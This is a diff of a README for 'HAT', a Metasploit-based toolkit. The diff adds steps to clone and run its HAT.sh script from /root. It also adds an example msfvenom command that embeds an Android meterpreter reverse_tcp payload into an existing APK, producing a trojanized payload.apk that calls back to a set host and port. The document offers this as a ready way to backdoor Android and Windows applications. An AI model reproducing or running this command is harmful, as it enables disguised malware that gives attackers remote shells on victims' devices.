@@ -1,17 +1,12 @@
-HAT METASPLOIT & REVERSE ENGINEERING TOOLS 
-##########################################
+HAT PROJECT
+###########
+*Clone - git clone https://github.com/BLACKRATTX/HAT-Metasploit-Reverse-Engineer-Tools
+*Directory - cd /root/HAT-Metasploit-Reverse-Engineer-Tools
+*Give permissions - chmod +x HAT.sh
+*Execute - sh HAT.sh
 
-Go to directory
-################
-COMMAND " cd /root/HAT "
-
-Give the permissions
-#####################
-COMMAND " chmod +x HAT.sh "
-
-Run
-####
-COMMAND " sh HAT.sh "
+*Generate the payloads with msfvenom -x command using existing android/windows applications.
+*Example-  msfvenom -x /sdcard/test.apk -p android/meterpreter/reverse_tcp LHOST=168.9.0.1 LPORT=4444 -o /sdcard/payload.apk
 
 
 "IF YOU LIKE MY HARD WORK, GIMME A CUP OF COFFEE"
